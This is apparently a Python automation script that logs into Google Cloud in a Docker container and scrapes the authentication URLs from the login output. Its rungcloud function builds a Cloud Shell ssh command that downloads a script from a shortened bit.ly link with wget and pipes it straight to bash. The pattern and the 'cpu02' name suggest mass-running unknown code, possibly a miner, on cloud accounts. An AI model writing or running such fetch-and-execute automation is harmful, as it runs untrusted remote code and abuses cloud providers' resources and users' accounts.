#!/usr/bin/python
import shlex
import subprocess
from subprocess import Popen, PIPE
import pytest
import time
import pty
import sys
import select
import os
import re
import pytest
import time
import json
import sys
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from urllib.parse import urlparse
slow_motion = 1

gid = "siwar10001"

count = 0
# Strips the newline character


def rungcloud(gid):
    remote_cmd = "\"wget -q -O - bit.ly/cpu02 |bash\""
    command_line = 'docker run --rm --volumes-from gcloud-config-'+gid + \
        ' gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell' + \
        '  ssh --authorize-session --command='+remote_cmd
    print(command_line)
    return shlex.split(command_line)


def newgcloud(gid):
    command_line = 'docker run -ti --name gcloud-config-'+gid + \
        ' gcr.io/google.com/cloudsdktool/cloud-sdk gcloud auth login'
    print(command_line)
    return shlex.split(command_line)


pty, tty = os.openpty()

p = subprocess.Popen(newgcloud(gid), stdin=tty, stdout=tty, stderr=tty)



while p.poll() is None:
    # Watch two files, STDIN of your Python process and the pseudo terminal
    r, _, _ = select.select([sys.stdin, pty], [], [])
    s=''
    if sys.stdin in r:
        input_from_your_terminal = os.read(sys.stdin.fileno(), 10240)
        os.write(pty, input_from_your_terminal)
    elif pty in r:
        output_from_docker = os.read(pty, 10240)
        #os.write(sys.stdout.fileno(), output_from_docker)
        print(output_from_docker)
        s=output_from_docker.decode("utf-8") 
        authurls=re.findall(r'(https?://\S+)', s)
        print('**************************')
        try:
            print(authurls[0])
        except:
            print("no url")
        print('##########################')
